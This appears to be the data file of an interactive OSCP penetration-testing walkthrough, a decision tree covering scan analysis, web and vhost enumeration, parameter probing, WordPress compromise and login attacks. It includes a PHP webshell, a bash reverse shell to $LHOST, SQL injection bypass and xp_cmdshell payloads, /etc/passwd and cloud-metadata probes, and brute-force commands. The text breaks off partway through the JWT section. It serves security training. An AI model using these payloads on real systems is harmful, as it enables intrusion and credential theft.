  // ══════════════════════════════════════════
  //  ANALYSIS — READ BEFORE YOU ATTACK
  // ══════════════════════════════════════════

  analyze_output: {
    phase: "ANALYSIS",
    title: "Read the Scan — Before You Attack",
    body: "Most people skip this step. They see port 80 and jump to web_enum. Slow down. Every line of nmap output is signal. Read it as a complete picture before you choose your attack path.",
    cmd: `# Print your targeted scan output
cat scans/targeted.txt

# ── WHAT TO LOOK FOR ─────────────────────
# 1. SERVICE VERSIONS — are any outdated?
#    Apache 2.4.49, OpenSSH 7.2, Samba 3.x = immediate CVE candidates
#    searchsploit [service] [version]

# 2. OS FINGERPRINT — Linux or Windows?
#    Linux: privesc via sudo/SUID/cron
#    Windows: privesc via tokens/services/registry
#    OS tells you which post-exploit branch you will take

# 3. PORT COMBINATIONS — what does the full picture say?
#    80 + 445 + 5985     = Windows web server, likely AD-adjacent
#    21 + 22 + 80        = Linux, FTP may feed webroot
#    80 + 3306           = web + DB, SQLi → direct DB access
#    445 + 88 + 389      = Domain Controller
#    8080 + 8009         = Tomcat (AJP connector — Ghostcat)
#    3000               = Grafana
#    6379               = Redis (likely unauthenticated)
#    27017              = MongoDB (likely unauthenticated)

# 4. NSE SCRIPT OUTPUT — read it all
#    smb-security-mode: message_signing disabled = relay possible
#    http-title: [title] tells you what the app is
#    ssl-cert: common name reveals internal hostnames
#    ssh-hostkey: algorithm age signals OS vintage

# 5. FILTERED vs CLOSED
#    Closed = port exists, nothing listening
#    Filtered = firewall present — UDP or retry later`,
    warn: "SSL certificates contain hostnames. Add every CN and SAN you find to /etc/hosts — they often resolve to different virtual hosts that expose separate attack surfaces.",
    choices: [
      { label: "Multiple services — help me prioritize", next: "analyze_multiservice" },
      { label: "I see a version number — let me assess it", next: "analyze_versions" },
      { label: "Output looks ambiguous — nothing obvious", next: "analyze_ambiguous" },
      { label: "Looks like a Domain Controller", next: "analyze_dc" },
      { label: "I know what I am looking at — go attack", next: "targeted_scan" },
    ],
  },

  analyze_multiservice: {
    phase: "ANALYSIS",
    title: "Multiple Services — Priority Order",
    body: "Multiple attack surfaces on one box is common. The mistake is jumping to the most familiar service rather than the highest-value one. Use this priority framework.",
    cmd: `# ── ATTACK SURFACE PRIORITY ─────────────
# Rank your open services using this logic:

# TIER 1 — Exploit immediately if present
#   Unauthenticated RCE (Redis, MongoDB, Elasticsearch no-auth)
#   Known unpatched CVE with public exploit (check versions)
#   Anonymous FTP write access to webroot
#   SMB without signing + relay opportunity

# TIER 2 — High value, enumerate thoroughly first
#   Web application (parameters, login, upload)
#   SMB shares (anonymous read = credential hunting)
#   MSSQL/MySQL (creds from elsewhere may give xp_cmdshell)

# TIER 3 — Useful after initial access
#   SSH (you need creds first — brute only as last resort)
#   RDP (same — creds needed, expensive to brute)
#   WinRM (same — tool for lateral movement, not initial access)

# ── COMMON WINNING COMBINATIONS ──────────
# FTP (anon) + HTTP:
#   Download FTP → find creds → login web
#   OR upload webshell via FTP if FTP root = webroot

# SMB + HTTP:
#   Spider SMB shares first — credentials often in scripts/configs
#   Use found creds on web login

# HTTP + SSH:
#   Exploit web first → get shell as www-data
#   Find SSH key in webroot or /home → pivot to user

# HTTP + DB (3306/5432/1433/27017):
#   Web SQLi → direct DB shell
#   OR find DB creds in web config → connect directly

# ── YOUR CURRENT SURFACE ─────────────────
# List your ports: [fill in]
# Highest tier present: [fill in]
# Starting with: [fill in]`,
    warn: "If you see Redis (6379) or MongoDB (27017) open — test unauthenticated access FIRST before anything else. These are often instant shells with zero effort.",
    choices: [
      { label: "Web is highest value — enumerate it", next: "web_enum" },
      { label: "SMB first — shares may have credentials", next: "smb_enum" },
      { label: "Unauthenticated DB/service — instant win", next: "research_unknown" },
      { label: "FTP + web combination", next: "ftp_enum" },
      { label: "Back to full output analysis", next: "analyze_output" },
    ],
  },

  analyze_versions: {
    phase: "ANALYSIS",
    title: "Version Analysis — Is This Exploitable?",
    body: "A version number is a gift. Most people searchsploit it once and move on. Do it properly — cross-reference multiple sources, understand what the exploit actually does before you run it.",
    cmd: `# ── SEARCHSPLOIT ─────────────────────────
searchsploit [service] [version]
searchsploit -x [exploit/path]   # read before running

# ── CROSS-REFERENCE ──────────────────────
# NVD: https://nvd.nist.gov/vuln/search
# ExploitDB: https://www.exploit-db.com
# GitHub: site:github.com [service] [version] exploit
# PacketStorm: packetstormsecurity.com

# ── VERSION READING TIPS ──────────────────
# nmap shows: Apache httpd 2.4.49
#   searchsploit apache 2.4.49   → CVE-2021-41773 path traversal/RCE
#
# nmap shows: OpenSSH 7.2p2
#   searchsploit openssh 7.2     → user enumeration (less useful)
#   but 7.2 on Ubuntu = Ubuntu 16.04 = kernel exploit candidates
#
# nmap shows: Samba 4.x.x
#   check if < 4.6.4 → SambaCry (CVE-2017-7494)
#   check if 3.x → very old, many exploits
#
# nmap shows: Microsoft IIS 10.0
#   IIS 10 = Windows Server 2016/2019 or Windows 10
#   look for WebDAV, PUT upload, ASPX execution

# ── EXPLOIT QUALITY CHECK ────────────────
# Before running any exploit ask:
# 1. Does the version match EXACTLY? (2.4.49 ≠ 2.4.50)
# 2. Is there a Metasploit module? (fastest to test)
# 3. Is the PoC Python 2 or 3? (check shebang line)
# 4. Does it need modification? (LHOST/LPORT/target URL)
# 5. What does success look like? (RCE? file read? DoS?)
# 6. Will it crash the service? (avoid on OSCP — limited attempts)`,
    warn: "Version numbers in nmap are detected by banners — services can lie or be misconfigured. If searchsploit returns nothing, try one version up and one version down. Banners are not always accurate.",
    choices: [
      { label: "Found a CVE — test it", next: "searchsploit_web" },
      { label: "No CVE — back to attack surface priority", next: "analyze_multiservice" },
      { label: "Web version — enumerate the app instead", next: "web_enum" },
      { label: "SMB version — check MS17-010", next: "smb_enum" },
    ],
  },

  analyze_ambiguous: {
    phase: "ANALYSIS",
    title: "Ambiguous Output — Reading the Signal",
    body: "Nothing obvious in the scan. This is not the same as nothing there. Ambiguous output has a specific set of follow-up moves. Work through them systematically before concluding the surface is locked.",
    cmd: `# ── WHEN NMAP OUTPUT LOOKS THIN ──────────

# 1. DID YOU SCAN ALL PORTS?
nmap -p- --min-rate 5000 $ip -oN allports.txt
# Services on high ports (8080, 8443, 8888, 9090, 10000) are common

# 2. UDP — HAVE YOU CHECKED IT?
sudo nmap -sU --top-ports 100 $ip -oN udp.txt
# SNMP (161), TFTP (69), DNS (53) often only on UDP
# SNMP especially — community string "public" = info dump

# 3. WEB — IS THERE A VIRTUAL HOST?
curl -sv http://$ip   # check the response title
# If title shows a domain name: add to /etc/hosts and revisit
# If 400 Bad Request on HTTPS: server requires SNI — use -k and hostname

# 4. ARE YOU READING 403 CORRECTLY?
# 403 Forbidden = the resource EXISTS but you lack permission
# 403 is NOT the same as 404. It is a door that is locked, not absent.
# Try: different HTTP method (OPTIONS, PUT, PATCH)
# Try: path traversal (/../admin, /./admin)
# Try: different User-Agent (Googlebot, curl)
# Try: add trailing slash (/admin/)

# 5. RESPONSE SIZE VARIATION
# Two 403s with different response sizes = different content behind them
# Feroxbuster: filter by size to find anomalies
feroxbuster -u http://$ip --filter-size [common_size]

# 6. NOTHING AT ALL?
# Check if the service is actually up
nc -nv $ip [port]
telnet $ip [port]
# Sometimes nmap misfires on rate-limited or filtered hosts`,
    warn: "A wall of 403s from feroxbuster is not nothing — it means content exists. The question is what HTTP method, header, or path variation gets you past the filter.",
    choices: [
      { label: "Found content on high port", next: "web_enum" },
      { label: "SNMP is open — enumerate it", next: "other_services" },
      { label: "Virtual host discovered", next: "subdomain_enum" },
      { label: "403s everywhere — dig into them", next: "web_fuzz_deep" },
      { label: "Genuinely nothing — try UDP fully", next: "analyze_output" },
      { label: "I think I am in a rabbit hole", next: "mindset_rabbithole" },
    ],
  },

  analyze_dc: {
    phase: "ANALYSIS",
    title: "Reading a Domain Controller",
    body: "A DC has a signature port combination. If you see it, you are in an AD environment. The attack path is completely different from a standalone machine — do not treat it like a normal box.",
    cmd: `# ── DC SIGNATURE PORTS ───────────────────
# 53   DNS       — zone transfer attempt first
# 88   Kerberos  — AS-REP roast, Kerberoast
# 135  MSRPC
# 139  NetBIOS
# 389  LDAP      — anonymous bind? enumerate users
# 445  SMB       — shares, relay, eternal blue
# 464  Kpasswd
# 593  RPC over HTTP
# 636  LDAPS
# 3268 Global Catalog LDAP
# 3269 Global Catalog LDAPS
# 5985 WinRM     — if you get DA creds, shell here

# ── FIRST MOVES ON A DC ──────────────────
# 1. Get the domain name
nmap -p 389 --script ldap-rootdse $ip
crackmapexec smb $ip   # shows domain, hostname, OS

# 2. DNS zone transfer
dig axfr [domain] @$ip
# If it works: full internal host map

# 3. LDAP anonymous bind
ldapsearch -x -h $ip -b "dc=[domain],dc=com"
# If it works: full user/group list without creds

# 4. SMB null session
crackmapexec smb $ip -u "" -p "" --shares
enum4linux-ng $ip

# 5. Do NOT try to brute force Kerberos
# Account lockout is real on DCs
# Use AS-REP roast (no creds needed) and Kerberoast (creds needed)

# ── KEY DECISION ─────────────────────────
# Do you have ANY credentials yet?
# No creds: AS-REP roast, LDAP anon, DNS zone transfer, Responder
# Have creds: BloodHound immediately, then follow the path`,
    warn: "Never attack the DC directly in an OSCP AD set — you reach it last, through the chain. The DC is the destination, not the entry point. Start with the workstation or member server.",
    choices: [
      { label: "No creds yet — AS-REP roast first", next: "asrep_roast" },
      { label: "Have creds — run BloodHound", next: "bloodhound" },
      { label: "Run Responder to capture hashes", next: "responder" },
      { label: "Full AD methodology", next: "ad_nocreds" },
    ],
  },

  // ══════════════════════════════════════════
  //  WEB
  // ══════════════════════════════════════════
  web_enum: {
    phase: "WEB",
    title: "Web Enumeration",
    body: "Web is open. Run tools in parallel — but read manually while they run. The goal is not to finish the checklist, it is to find the one thing that moves you forward. Tools find paths; you find meaning in what those paths return.",
    cmd: `# ── AUTOMATED — run in background ────────
# feroxbuster — recursive depth, good for nested dirs
feroxbuster -u http://$ip \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -x php,html,txt,bak,old,zip --depth 3 -o scans/ferox.txt

# ffuf — flat file fuzz (faster, easier real-time filtering)
ffuf -u http://$ip/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
  -e .php,.html,.txt,.bak,.zip,.old \\
  -fc 404 -o scans/ffuf_files.txt

# ffuf — flat directory fuzz
ffuf -u http://$ip/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -fc 404 -o scans/ffuf_dirs.txt

# NOTE: soft 404s are common on OSCP boxes — if the app returns 200 for everything,
# get a baseline size first, then filter by size instead of status code:
#   curl -s http://$ip/doesnotexist123 | wc -c   → note the byte count
#   ffuf ... -fs [baseline_size]
#   feroxbuster ... --filter-size [n]

nikto -h http://$ip -o scans/nikto.txt &

# ── FINGERPRINT ───────────────────────────
whatweb -v http://$ip
curl -sv http://$ip 2>&1 | grep -E "< HTTP|< Server|< X-|< Set-Cookie|< Location"

# ── MANUAL READS — do these while tools run ──
curl -s http://$ip/robots.txt
curl -s http://$ip/sitemap.xml
curl -s http://$ip/.well-known/security.txt

# ── READ THE PAGE SOURCE ──────────────────
# What framework/CMS is it? Look for:
#   Generator meta tag, /wp-content/, /wp-login.php → WordPress
#   /administrator/ → Joomla
#   /typo3/ → TYPO3
#   jQuery version, Angular, React — hints at app age/stack
curl -s http://$ip | grep -iE "generator|wp-content|joomla|typo3|framework|version"

# ── RESPONSE HEADERS — read every line ───
# Server: Apache/2.4.49 → version → searchsploit
# X-Powered-By: PHP/7.2 → old PHP, deserialisation candidates
# Set-Cookie: → no HttpOnly/Secure flags = XSS/interception risk
# Location: → redirect target may reveal internal hostname
# X-Frame-Options missing → signals weak hardening overall

# ── VHOST FUZZING ────────────────────────
# Many OSCP boxes respond differently on a vhost vs the IP
# The IP returns a default page; the vhost returns the real app
# ALWAYS try this when you find a domain name in certs or source

# Get domain name first:
# - From TLS cert (see below)
# - From /etc/hosts on a compromised machine
# - From nmap output (PTR records, hostnames)

# ffuf vhost fuzz (filter by response size baseline):
# First: curl -s http://$ip/ | wc -c  → note baseline size
ffuf -u http://$ip -H "Host: FUZZ.domain.com" \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  -fs [baseline_size]

# If you don't know the domain — try common patterns:
ffuf -u http://$ip -H "Host: FUZZ.$ip" \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  -fs [baseline_size]

# Add discovered vhost to /etc/hosts, then enumerate it fresh:
echo "$ip dev.domain.com" >> /etc/hosts
# Now treat dev.domain.com as a completely new web target

# gobuster vhost mode:
gobuster vhost -u http://$ip \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  --append-domain -r

# ── HTTPS — check cert for hostnames ─────
echo | openssl s_client -connect $ip:443 2>/dev/null | openssl x509 -noout -text \\
  | grep -E "Subject:|DNS:"
# Cert SANs often reveal internal hostnames and vhosts — add ALL of them to /etc/hosts
# Every CN and SAN hostname → add to /etc/hosts → may resolve to different vhost

# ── VIRTUAL HOSTS ─────────────────────────
# If hostname differs from IP, other vhosts likely exist
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
  -u http://$ip -H "Host: FUZZ.DOMAIN" -fs [baseline_size]

# ── BACKUP / SENSITIVE FILE CHECK ─────────
for f in .env .git/HEAD .git/config config.php wp-config.php .htaccess backup.zip \\
          database.sql admin.php phpinfo.php info.php test.php shell.php; do
  curl -so /dev/null -w "%{http_code} $f\n" http://$ip/\$f
done`,
    warn: "A 403 is not a dead end — it means the resource exists. Try: trailing slash, HTTP verb switching (OPTIONS/PUT), path case variation, and adding common headers (X-Forwarded-For: 127.0.0.1). SSL certs frequently expose internal hostnames that resolve to entirely different attack surfaces.",
    choices: [
      { label: "Found WordPress", next: "wordpress" },
      { label: "Found login page", next: "login_page" },
      { label: "Found file upload", next: "file_upload" },
      { label: "IIS server — ASPX shell path", next: "iis_aspx" },
      { label: "Jenkins on 8080/8443", next: "jenkins" },
      { label: "WebDAV enabled", next: "webdav" },
      { label: "Grafana on 3000", next: "grafana" },
      { label: "Splunk on 8000/8089", next: "splunkd" },
      { label: "URL has parameter (?id=1, ?page=, ?file=)", next: "param_found" },
      { label: "Outdated server version — searchsploit it", next: "searchsploit_web" },
      { label: "Found domain name / hostname in cert or headers", next: "vhost_enum" },
      { label: "New subdomain (DNS-based)", next: "subdomain_enum" },
      { label: "Nothing obvious — fuzz deeper", next: "web_fuzz_deep" },
    ],
  },

  vhost_enum: {
    phase: "WEB",
    title: "Virtual Host Enumeration",
    body: "Virtual hosting is one of the most common reasons a box looks dead on the IP but has a full attack surface on a hostname. The IP returns a default Apache/nginx page; the real app lives on dev.domain.htb, admin.domain.htb, or something custom. This is a mandatory step whenever you find a domain name anywhere — TLS cert, nmap output, page source, /etc/hosts on a compromised machine. vhost fuzzing is different from subdomain fuzzing: it sends the word as a Host header to the same IP, not a DNS lookup. The response size difference is your signal.",
    cmd: `# ── STEP 0: FIND THE DOMAIN NAME FIRST ──
# From TLS certificate (most reliable):
openssl s_client -connect $ip:443 </dev/null 2>/dev/null \
  | openssl x509 -noout -text \
  | grep -E "Subject:|DNS:"
# Look for: CN=domain.htb, DNS:*.domain.htb, DNS:admin.domain.htb

# From nmap output (already in your scan):
grep -E "hostname|commonName|Subject" targeted.txt
# smb-os-discovery also shows computer name → hint at domain

# From page source:
curl -s http://$ip | grep -iE "href|action|src" | grep -v "http://$ip" | head -20
# Look for: href="http://dev.domain.htb" or internal hostnames

# From HTTP headers:
curl -sv http://$ip 2>&1 | grep -iE "location:|set-cookie:|host:"
# Redirect Location headers often contain the real hostname

# ── STEP 1: ADD KNOWN DOMAIN TO /etc/hosts ──
echo "$ip domain.htb" >> /etc/hosts
curl -sv http://domain.htb    # compare to http://$ip — different content = vhost confirmed

# ── STEP 2: FUZZ VHOSTS — ffuf (preferred) ──
# ffuf sends each word as the Host header to the same IP
# The size filter removes the default page (get baseline first):
curl -s http://$ip | wc -c        # baseline size — note this number

ffuf -u http://$ip \
  -H "Host: FUZZ.domain.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -fs <BASELINE_SIZE> \
  -o scans/vhosts.txt

# gobuster vhost mode:
gobuster vhost -u http://domain.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --append-domain \
  -o scans/vhosts.txt

# ── STEP 3: ADD ALL FINDINGS TO /etc/hosts ──
echo "$ip dev.domain.htb admin.domain.htb internal.domain.htb" >> /etc/hosts

# ── STEP 4: ENUMERATE EACH VHOST INDEPENDENTLY ──
# Each vhost is a fresh attack surface — full web enum from scratch
# Different app on dev vs admin vs internal
for host in dev admin internal test staging api; do
  echo "=== Testing: $host.domain.htb ==="
  curl -sv -H "Host: $host.domain.htb" http://$ip 2>&1 | grep -E "HTTP|Content-Length|Location"
done`,
    warn: "The size filter (-fs) is critical. Without it, ffuf returns every word as a 'hit' because the server returns 200 with the default page. Get the baseline content-length first (curl $ip | wc -c) and filter exactly that. If the baseline varies by a few bytes, use a range: -fs 1234,1235,1236. Also check HTTPS (port 443) separately — the cert SAN field often lists all vhosts directly.",
    choices: [
      { label: "Found vhost — enumerate it as new web target", next: "web_enum" },
      { label: "Nothing found — DNS subdomain enum", next: "subdomain_enum" },
      { label: "Found admin panel vhost", next: "login_page" },
    ],
  },

  subdomain_enum: {
    phase: "WEB",
    title: "Subdomain Enumeration",
    body: "Subdomains often expose dev, admin, or internal panels. Always add discovered subs to /etc/hosts before testing.",
    cmd: `gobuster dns -d domain.org \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\
  -t 30

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\
  -u http://FUZZ.domain.org -o scans/subdomains.txt

# Add to /etc/hosts
echo "$ip sub.domain.org" >> /etc/hosts`,
    warn: "Verify every subdomain resolves to an in-scope IP before testing.",
    choices: [
      { label: "Found subdomain — enumerate it as new web target", next: "web_enum" },
      { label: "Nothing — keep fuzzing main host", next: "web_fuzz_deep" },
    ],
  },

  web_fuzz_deep: {
    phase: "WEB",
    title: "Deep Web Fuzzing",
    body: "Go wider and deeper. Parameter brute force, LFI testing, XSS, command injection wordlists. Use wfuzz for fine-grained control.",
    cmd: `# Parameter brute force
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\
  --hc 404 "http://$ip/page?FUZZ=test"

# LFI wordlist
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\
  --hc 404 "http://$ip/page?file=FUZZ"

# XSS fuzz
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/XSS.txt \\
  "http://$ip/page?param=FUZZ"

# Command injection fuzz (POST)
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
  -d "field=FUZZ" "http://$ip/page"

# HTML escape fuzz
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt \\
  "http://$ip/page?param=FUZZ"`,
    warn: null,
    choices: [
      { label: "Found LFI", next: "lfi" },
      { label: "Found command injection", next: "cmd_injection" },
      { label: "Found XSS", next: "xss" },
      { label: "Found parameter — test for SQLi", next: "sqli_test" },
      { label: "Template injection ({{7*7}} returns 49)", next: "ssti" },
      { label: "URL/redirect parameter — SSRF", next: "ssrf" },
      { label: "XML input / SOAP endpoint / file upload", next: "xxe" },
      { label: "Numeric ID in URL or API — IDOR test", next: "idor" },
      { label: "Still nothing — searchsploit service versions", next: "searchsploit_web" },
    ],
  },

  param_found: {
    phase: "WEB",
    title: "Parameter Found",
    body: "URL parameter detected. Before reaching for tools, read the parameter name and context — it tells you what the app is doing. ?file= screams LFI. ?id= screams SQLi. ?url= screams SSRF. ?template= screams SSTI. Start with single manual probes, watch the full response — status code, body length, error text, redirect behavior. One response difference is enough to confirm a class.",
    cmd: `# ── READ THE PARAMETER FIRST ─────────────
# What does the name suggest?
#   ?file=, ?path=, ?page=, ?include=, ?doc=   → LFI / path traversal
#   ?id=, ?user_id=, ?item=, ?cat=             → SQLi
#   ?cmd=, ?exec=, ?ping=, ?host=              → CMDi
#   ?url=, ?redirect=, ?next=, ?dest=, ?src=   → SSRF / open redirect
#   ?template=, ?view=, ?layout=               → SSTI
#   ?search=, ?q=, ?name=                      → XSS / SQLi

# ── MANUAL PROBES — one at a time ────────
# SQLi — inject a quote, watch for error or behavioral change
curl -s "http://$ip/page?id=1'"
curl -s "http://$ip/page?id=1 AND 1=2--"   # boolean: different length = blind

# LFI — path traversal probe
curl -s "http://$ip/page?file=../../../../etc/passwd"
curl -s "http://$ip/page?file=/etc/passwd"

# CMDi — inject separator, watch for delay or output
curl -s "http://$ip/page?cmd=id;id"
curl -s "http://$ip/page?host=127.0.0.1;sleep+5"   # 5s delay = blind CMDi

# SSRF — force outbound request to your listener
# nc -lvnp 80 first, then:
curl -s "http://$ip/page?url=http://YOUR_IP/"
curl -s "http://$ip/page?url=http://169.254.169.254/latest/meta-data/"  # AWS IMDSv1

# SSTI — inject template syntax, watch for evaluation
curl -s "http://$ip/page?template={{7*7}}"      # expect 49 in output = Jinja2/Twig
curl -s "http://$ip/page?template=\${7*7}"      # FreeMarker / Thymeleaf
curl -s "http://$ip/page?template=<%= 7*7 %>"   # ERB (Ruby)

# XSS — reflected check
curl -s "http://$ip/page?search=<script>alert(1)</script>" | grep -i script

# ── HIDDEN PARAMETER DISCOVERY ───────────
# arjun — fast hidden param discovery (checks behavior changes)
arjun -u "http://$ip/page" -m GET
arjun -u "http://$ip/page" -m POST

# ffuf — brute-force parameter names
ffuf -u "http://$ip/page?FUZZ=test" \\
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\
  -fs [baseline_size] -t 40

# POST parameter brute force
ffuf -u "http://$ip/page" -X POST \\
  -d "FUZZ=test" \\
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -fs [baseline_size]

# ── TYPE JUGGLING (PHP loose comparison) ─
# PHP == operator: "0e123" == "0e456" (both evaluate to 0 in scientific notation)
# Try these as password/token values:
0e1234567890                     # PHP magic hash
true                             # JSON boolean
[]                               # array (may bypass strcmp())
# In Burp: change Content-Type to application/json, send {"user":"admin","pass":true}`,
    warn: "Baseline your response BEFORE injecting. Note: status code, content length (curl -s -o /dev/null -w '%{size_download}'), and response time. A 1-byte difference in content length with the same status code is blind SQLi. A 5-second delay is blind CMDi. You will miss both if you only look at status codes.",
    choices: [
      { label: "SQLi looks promising", next: "sqli_test" },
      { label: "LFI response detected", next: "lfi" },
      { label: "Command injection response", next: "cmd_injection" },
      { label: "URL/redirect param — SSRF", next: "ssrf" },
      { label: "Template syntax reflected — SSTI", next: "ssti" },
      { label: "XSS reflected in response", next: "xss" },
      { label: "Hidden params found via arjun/ffuf", next: "param_found" },
    ],
  },

  wordpress: {
    phase: "WEB",
    title: "WordPress",
    body: "WordPress has a consistent attack surface. Vulnerable plugins are the most reliable path — more CVEs per square inch than any other CMS. xmlrpc.php enables amplified brute force (500 cred attempts per request). User enumeration via /wp-json/wp/v2/users or ?author=1 gives you valid usernames for targeted attacks. Admin access gives you the theme editor = RCE. The goal is: enumerate → users → admin creds → shell.",
    cmd: `# ── STEP 0: CONFIRM WP AND VERSION ───────
curl -s http://$ip | grep -i "wp-content\\|wp-includes\\|WordPress"
curl -s http://$ip/wp-login.php | head -5

# Version detection:
curl -s http://$ip/readme.html | grep -i version
curl -s http://$ip | grep "ver=" | grep "wp-content" | head -5

# ── STEP 1: WPSCAN ────────────────────────
# Free API token from wpscan.com — enables vuln data
wpscan --url http://$ip \\
  --enumerate u,ap,at,cb,dbe \\
  --plugins-detection aggressive \\
  --api-token <TOKEN> \\
  -o scans/wpscan.txt

# No token:
wpscan --url http://$ip --enumerate u,ap,at -o scans/wpscan.txt

# ── STEP 2: USER ENUMERATION ─────────────
# REST API (default exposed WP 4.7+)
curl -s http://$ip/wp-json/wp/v2/users | python3 -m json.tool

# Author URL enumeration
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "$i: %{redirect_url}\\n" "http://$ip/?author=$i"
done

# ── STEP 3: XMLRPC ABUSE ──────────────────
# Check if exposed:
curl -s http://$ip/xmlrpc.php
# "XML-RPC server accepts POST requests only" = enabled

# WPScan xmlrpc — 500 attempts per request:
wpscan --url http://$ip \\
  -U admin,administrator \\
  -P /usr/share/wordlists/rockyou.txt \\
  --password-attack xmlrpc-multicall

# ── STEP 4: PLUGIN CVE SEARCH ────────────
# WPScan lists installed plugins + versions in output
# Searchsploit every one:
searchsploit wordpress <plugin_name>
searchsploit <plugin_name> <version>

# High-value plugin vulns (common on OSCP):
# WP File Manager 6.0-6.9    → unauthenticated RCE
# Duplicator < 1.3.28         → path traversal
# Contact Form 7 < 5.3.2      → unrestricted file upload

# ── STEP 5: DEFAULT CREDS ────────────────
# Always try before brute force:
# admin:admin  admin:password  admin:[sitename]  admin:[domain]

# ── STEP 6: BRUTE FORCE ──────────────────
wpscan --url http://$ip \\
  -U admin \\
  -P /usr/share/wordlists/rockyou.txt \\
  --password-attack wp-login -t 50`,
    warn: "xmlrpc.php is the fastest brute path — 500 attempts per HTTP request vs 1 with wp-login. Always check /wp-json/wp/v2/users first for free username enumeration. If the WPScan API token finds a vulnerable plugin, searchsploit it before pivoting to brute force — a plugin RCE doesn't need creds at all.",
    choices: [
      { label: "Got admin creds — theme editor or plugin shell", next: "wp_shell" },
      { label: "Found vulnerable plugin — read and fire", next: "exploit_readcheck" },
      { label: "xmlrpc.php exposed — brute force", next: "bruteforce" },
      { label: "No attack surface — fuzz deeper", next: "web_fuzz_deep" },
    ],
  },

  wp_shell: {
    phase: "WEB",
    title: "WordPress → Shell",
    body: "Two paths: theme editor (Appearance → Theme Editor → 404.php) or malicious plugin zip. Both drop a webshell.",
    cmd: `# Option 1: Theme Editor
# Appearance > Theme Editor > select 404.php
# Add: <?php system($_GET['cmd']); ?>
# Access: http://$ip/wp-content/themes/<theme>/404.php?cmd=id

# Option 2: Malicious Plugin
# Create plugin zip with PHP shell inside
# Upload via Plugins > Add New > Upload

# Once confirmed RCE — reverse shell
curl "http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"`,
    warn: null,
    choices: [
      { label: "RCE confirmed — catch shell", next: "reverse_shell" },
    ],
  },

  login_page: {
    phase: "WEB",
    title: "Login Page",
    body: "Work the login page in tiers. Default creds take 5 minutes and win more often than they should. SQLi bypass is next — it is fast and bypasses auth entirely. Username enumeration is a force multiplier before any brute force. Don't spray blind — know your usernames first. Watch for JWT, 2FA, OAuth flows; each has its own bypass path.",
    cmd: `# ── TIER 1: DEFAULT CREDS (try these first) ──
# Admin panels
admin:admin          admin:password       admin:admin123
admin:1234           admin:Password1      administrator:administrator
# CMS defaults
admin:admin          admin:password       admin:admin2023
# Appliance / service defaults
root:root            root:toor            root:password
guest:guest          test:test            user:user
pi:raspberry         ubnt:ubnt            cisco:cisco
# Always try: username AS password (e.g. found user "john" → john:john)
# Always try: blank password

# ── TIER 2: SQLi AUTH BYPASS ──────────────
# Classic — terminates WHERE clause
' OR 1=1--
' OR '1'='1'--
' OR 1=1#
# Username field only — comment out password check
admin'--
admin'#
' OR 1=1-- -
# MSSQL
' OR 1=1--
'; EXEC xp_cmdshell('whoami')--   # if stacks work too
# PostgreSQL
' OR 1=1--
' OR 'x'='x'--

# ── wfuzz SQLi WORDLIST — when manual payloads fail ──
# Intercept the login request in Burp first — confirm exact param names
# Then fuzz the username field with a full SQLi list:
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-sqli.txt \\
  -d "username=FUZZ&password=test" \\
  --hc 200 \\
  http://$ip/login
# --hc 200 hides failed logins (200 = wrong creds) — successful bypass often 302/301
# If all return 200, switch to filtering by response size:
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-sqli.txt \\
  -d "username=FUZZ&password=test" \\
  --hw [baseline_word_count] \\
  http://$ip/login
# Get baseline word count: wfuzz a known-bad payload first, note "W" column

# ── TIER 3: USERNAME ENUMERATION ─────────
# Method 1: response length difference (login form)
# Baseline valid user vs invalid — different length = enumerable
curl -s -o /dev/null -w '%{size_download}' \\
  -X POST http://$ip/login -d "user=admin&pass=wrongpassword"
curl -s -o /dev/null -w '%{size_download}' \\
  -X POST http://$ip/login -d "user=notauser&pass=wrongpassword"

# Method 2: registration "user already exists"
curl -s -X POST http://$ip/register -d "user=admin&pass=test" | grep -i "exist\|taken\|already"

# Method 3: password reset "no account found"
curl -s -X POST http://$ip/reset -d "email=admin@$ip" | grep -i "found\|exist\|sent"

# ffuf username enumeration against login
ffuf -u http://$ip/login -X POST \\
  -d "username=FUZZ&password=wrongpassword" \\
  -w /usr/share/seclists/Usernames/Names/names.txt \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -fs [invalid_user_response_size]

# ── TIER 4: BRUTE FORCE ───────────────────
# Hydra — HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip \\
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials" -V -t 10

# Hydra — with known username list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip \\
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 10

# Hydra — HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-get /admin/ -t 10

# ── TIER 5: JWT ───────────────────────────
# Decode without verifying
echo "JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

